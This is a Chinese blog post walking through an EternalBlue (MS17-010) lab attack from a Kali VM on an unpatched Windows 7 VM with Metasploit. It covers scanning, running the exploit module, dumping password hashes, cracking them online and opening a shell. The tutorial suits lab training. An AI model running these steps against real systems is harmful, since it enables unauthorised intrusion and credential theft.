永恒之蓝

Posted on 2023-11-11 Edited on 2023-12-10

前提

有 cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso 镜像文件，并且创建了虚拟机win7，并且开启桥接模式或NAT模式，建议开桥接模式

有 kali-linux-2023-W10-vmware-amd64.vmwarevm.zip 文件，解压并且添加到虚拟机上，开启桥接模式或NAT模式，建议开桥接模式

这次是kali攻击win7。攻击机-kali：192.168.0.65。靶机-win7：192.168.0.64

两台机子可以相互ping通，并且靶机（无补丁）开启了445端口，防火墙是关闭的！

对win7的cmd ipconfig 一下，对kali的终端 ifconfig 一下，使得二者可以相互 ping 通

如果在kali上不小心使用了 ping 命令，使用 Ctrl + C 中断。

如果不放心可以查看进程 ps，再去查查PID和怎么杀死进程。

MSF

参考：MSF使用详解

Metasploit

Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。

Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。刚开始的Metasploit是采用Perl语言编写的，但是再后来的新版中，改成了用Ruby语言编写的了。在kali中，自带了Metasploit工具。

MSF的更新：msfupdate

Metasploit的安装和升级

注意：在一般的linux中，默认是不安装MSF的。以下是在非kali的Linux下安装MSF框架

漏洞复现

参考：渗透小技巧从getshell到3389端口远程桌面连接靶机

1、主机发现：

登录 kali linux，用 nmap 探测本网段存活主机

可以看到，靶机的445端口是开放的，而永恒之蓝利用的就是445端口的SMB服务，操作系统溢出漏洞。

2、使用 MSF 的永恒之蓝漏洞模块

打开MSF：（MSF每次打开都会有一个随机的界面，花里胡哨的）

如果想要看其它界面可以输入 banner 查看

搜索 ms17-010 代码：

一般会有4个结果

这里可以得到一些工具，其中 auxiliary/scanner/smb/smb_ms17_010 是永恒之蓝扫描模块， exploit/windows/smb/ms17_010_eternalblue 是永恒之蓝攻击模块。

一般配合使用，前者先扫描，若显示有漏洞，再进行攻击。

3、使用ms17-010扫描模块，对靶机进行扫描：

使用模块 use 3 ，可以使用 show options 命令查看这个模块需要配置的信息，Required的yes是必须要有的，所以要设置 RHOSTS ，也就是目标靶 set rhosts 192.168.0.64 。然后扫描探索一下 exploit 。这里有+号的就是可能存在漏洞的主机，这里有3个主机存在漏洞。

如果出现 Host is likely VULNERABLE to MS17-010! 的情况，就说明存在漏洞。

4、使用ms17-010攻击模块，对靶机进行攻击

使用模块 use 0 ，使用 info 命令查看这个漏洞的信息，使用命令 show targets 显示该攻击模块针对哪些特定操作系统版本、语言版本的系统。

然后可以使用 show options 命令查看这个模块需要配置的信息，Required的yes是必须要有的，所以要设置 RHOSTS ，也就是目标靶 set rhosts 192.168.0.64 。然后执行攻击： exploit 或 run 。

攻击完成！

5、查询信息

执行命令 sysinfo 显示靶机系统信息，执行命令 getuid ，执行 hashdump 查询靶机的登录用户名和密码

这个密码是hash值，需要在md5解密网站进行解密，解密网站有 md5在线解密破解,md5解密加密 (cmd5.com) 、 MD5免费在线解密破解_MD5在线加密-SOMD5

7、得到靶机shell

输入 shell 可进入靶机的命令提示符窗口，再输入 ipconfig 查看靶机的IP地址。（发现会乱码）

输入：chcp 65001 可解决乱码问题。

因为windows的代码页编号是936，而kali是Linux的，代码页编号是65001。

8、挂后台
